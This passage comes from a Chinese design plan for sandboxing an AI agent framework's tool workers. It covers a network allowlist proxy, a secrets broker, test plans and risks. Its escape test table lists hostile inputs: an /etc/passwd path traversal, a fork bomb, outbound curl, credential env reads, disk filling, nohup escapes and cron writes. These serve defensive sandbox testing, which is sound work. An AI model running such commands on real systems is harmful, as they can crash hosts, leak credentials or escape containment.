### M6 网络代理 + 凭证代理（M）✅ 已完成（2026-10-16，Linux 真跑已在容器验证通过）

- 本地 forwarder（Node http + CONNECT 隧道，hosts 白名单 + 审计日志）；
- secrets broker 协议扩展（`request-secret` op + `spec.secrets` 声明）；
- `--unshare-net` deny 路径与 proxy 路径双测试。

**验收**：`test/sandbox-m6.test.ts` 26 用例全绿（mergeSpec secrets 交集 3 +
纯函数 argv/profile/env 6 + forwarder 集成 7 + Tier 1 真跑 broker/proxy 端到端
8 + Linux-only bwrap proxy 放行/拒绝 2）；本地 Windows 全量回归 626/626
（基线 600 + 新增 26，零回归）；Docker（node:20-slim + bubblewrap 0.8.0 +
seccomp=unconfined）内 Linux 真跑全绿。

**实现说明**（与原设计的细化）：

- **forwarder**（`runtime/sandbox/net-proxy.ts`）：`startNetForwarder` 监听
  127.0.0.1 随机端口；普通请求（forward proxy 绝对 URI 形态）按提取 hostname
  白名单放行后 `http.request` 转发，CONNECT 隧道双向管道不解密（SNI 可见域名
  裁决）；审计日志记录域名/方法/双向字节量（不记 body）；白名单外 403 +
  `violation(kind=net)` 事件；空 hosts = 代理全拒（等效 deny）；
- **三个 provider 的 proxy 分支**：Tier 1/Seatbelt 在 `buildWorkerEnv` 白名单
  之上合并 `netProxyEnv`（HTTP(S)_PROXY 大小写变体 + NO_PROXY 防环；框架覆盖
  spec.env 同名键——proxy 模式下出口归框架）；bwrap 不再保守 `--unshare-net`，
  代理键以 `--setenv` 追加在 spec.env 之后；forwarder 启动失败 → `degraded` 事件
  + fail-closed 按 deny 处理（bwrap 回落 `--unshare-net`，Seatbelt 保持 deny
  default）；会话结束 `forwarder.close()`（closeAllConnections 强断活跃隧道）；
- **强制力如实声明**（与 R6 一致）：Tier 1 与 bwrap 的代理注入是 env 约定，
  不合作进程可绕过直连（内核强制断网只有 deny 路径）；Seatbelt 额外按 remote
  地址内核强制（仅放行 `127.0.0.1:port`，白名单外直连被内核拒绝）；
- **secrets broker**：`SandboxSpec.secrets?: string[]`（mergeSpec 收紧交集，
  复用 hosts 大小写不敏感语义）；协议新增 `request-secret`（worker→宿主，
  id 关联并发）与 `secret`（宿主→worker，value/error 互斥）消息；宿主裁决
  （声明名大小写不敏感匹配 → `ProtocolSessionSpec.resolveSecret` 取值，缺省
  宿主 `process.env`）后单条发放，worker 侧注入自身 `process.env[name]` 再
  resolve（不改造的工具请求后即可直接读 env）；未声明名 → 拒绝 +
  `violation(kind=secret, reason=not-declared)`；声明但宿主不可用 → error
  响应（非违规）；worker 侧 10s 防御超时防宿主无响应挂死；
- **worker API**：`globalThis.__aipackSandbox.requestSecret(name)`（
  `SANDBOX_GLOBAL_KEY` + `SandboxGlobalApi` 契约类型，工具模块顶层即可用）；
- **allow 告警**：`net.mode 'allow'` 直连时发 `degraded(reason=net-allow-direct)`
  事件提示收敛到 proxy/deny。

### M7 CLI 集成（S）

- `aipack --sandbox os|subprocess|off` 启动开关（映射 SandboxOptions）；
- `aipack doctor` 增加沙箱能力检测（bwrap 可用性 / WSL2 / cgroup v2），
  输出当前生效策略矩阵；
- 违规事件在 CLI 的用户可见提示（何时该收紧 spec）。

### M8 池化与性能（S，收尾）

- 同 spec 连续调用复用 worker（LRU 池，污染/超时/violation 后销毁）；
- spawn 开销基准：冷启动 p50/p95 记录入 CHANGELOG，目标 p50 < 80ms（Linux）。

---

## 11. 测试计划

### 11.1 单元测试（各模块）

- `mergeSpec`：交集/min/更严值/缺省补全/大小写路径；
- env 白名单构造：跨平台变量集差异快照；
- 协议编解码：畸形 JSON、超长行、半包。

### 11.2 集成测试（Tier 1）

- 正常执行往返（ToolResult 兼容 resourcesToMessages 契约回归）；
- abort / 超时 / 心跳丢失 → 进程树零残留（双平台）；
- 闭包工具降级、toolModules 解析失败路径。

### 11.3 逃逸测试（红队用例，Tier 2 验收核心）

| 用例                                   | 预期                          |
| -------------------------------------- | ----------------------------- |
| 读写工作区外路径（`../../etc/passwd`） | 拦截 + violation 事件         |
| symlink 指向工作区外                   | resolve 后拦截                |
| Windows 8.3 短名（`PROGRA~1`）         | realpath 消解后拦截           |
| 大小写变体路径（Windows）              | 大小写不敏感匹配拦截          |
| 读取宿主 env 凭证变量                  | 变量不存在                    |
| `curl` 外联（net deny）                | 连接失败                      |
| fork 炸弹（`:(){ :\|:& };:`）          | pids 配额截断 / 事后审计 kill |
| 磁盘写爆（dd 大文件）                  | 输出/磁盘限额触发 kill        |
| 后台进程逃逸（`nohup ... &`）          | 进程组 kill，无残留           |
| 写启动项/cron                          | 路径 deny 拦截                |

### 11.4 回归测试

- **零迁移回归**：全量现有测试套件在未配置 sandbox 时必须全绿（每阶段必跑）；
- 压缩往返契约：沙箱产出的 ToolResult 经 compactor / resourcesToMessages 无损。

---

## 12. 风险与开放问题

| #   | 风险/问题                                                              | 影响       | 对策                                                                      |
| --- | ---------------------------------------------------------------------- | ---------- | ------------------------------------------------------------------------- |
| R1  | Tier 1 软约束被误认为安全边界                                          | 误用       | 代码注释 + 文档 + `degraded` 事件三处显式声明"非硬边界"；CLI 显示当前强度 |
| R2  | worker spawn 开销（Windows ~100ms+）拖慢并行工具调用                   | 体验       | M8 池化；纯计算工具引导不声明 sandbox（留在 inprocess）                   |
| R3  | 闭包工具无法沙箱化，生态工具迁移成本                                   | 兼容       | 具名模块注册是既有主流形态；降级路径有明确 error 提示                     |
| R4  | Windows 原生依赖（Job Object）引入构建/分发复杂度                      | 分发       | 优先评估零依赖方案；原生模块作为可选增强（optionalDependencies）          |
| R5  | bwrap 在部分发行版/容器内不可用（嵌套容器无 userns）                   | 降级       | supports 探测 + 降级链是设计内建路径；doctor 可见                         |
| R6  | 网络代理的 TLS 透视局限（SNI 白名单可见、CONNECT 盲区）                | 审计完整性 | deny 为强保证，proxy 定位为"审计+宽松"，文档明示局限                      |
| O1  | MCP server 是否纳入同一沙箱契约（作为特殊 worker）？                   | 范围       | 待 MCP_PLAN 对齐，倾向复用 SandboxSpec                                    |
| O2  | `fs.deny` 缺省集（`~/.ssh`、`.env`、云凭证文件）是否默认全局生效？     | 默认值     | M3 定稿：倾向默认全局 deny + 显式解锁，但需社区输入                       |
| O3  | 多 agent 场景（multi-agent-design）沙箱 spec 是否 per-sub-agent 独立？ | 架构       | 倾向是：spec 挂 Tool/调用级，天然支持                                     |

---

## 13. 里程碑总览

```
M1 契约层(S) ──► M2 subprocess provider(M) ──► M3 ToolExecutor 接入(S)
                                          │
                     ┌────────────────────┼──────────────┐
                     ▼                    ▼              ▼
              M4 Linux OS(M)        M6 网络代理+凭证(M)   M7 CLI 集成(S)
                     │
                     ▼
              M5 Windows/macOS(M) ──► M8 池化优化(S)
```

- **本期交付**：M1 + M2 + M3（跨平台基线可用）+ M4（Linux 硬边界）+ M7；
- **下期**：M5 + M6 + M8；
- 每阶段完成定义：代码 + 单测/集成测试绿 + 逃逸用例（适用项）通过 + 现有套件全绿
  - CHANGESET（遵循仓库 .changeset 流程）。

---

## 附录：术语表

| 术语                 | 定义                                                      |
| -------------------- | --------------------------------------------------------- |
| 授权层（Permission） | 执行前裁决允许/拒绝/审批的策略层（已有 PermissionPolicy） |
| 隔离层（Sandbox）    | 执行期强制约束（fs/net/env/资源/进程），本计划交付        |
| 软约束               | 进程内 facade 实现，可被有意绕过，定位为防误操作+审计     |
| 硬边界               | OS 强制访问控制实现，不可被沙箱内进程绕过                 |
| worker               | 沙箱内执行工具的子进程，经 NDJSON 与宿主通信              |
| 降级链               | `microvm → os → subprocess → inprocess`，能力不足逐级回退 |
| enforced             | 严格模式：禁止降级，能力不足直接拒绝执行                  |
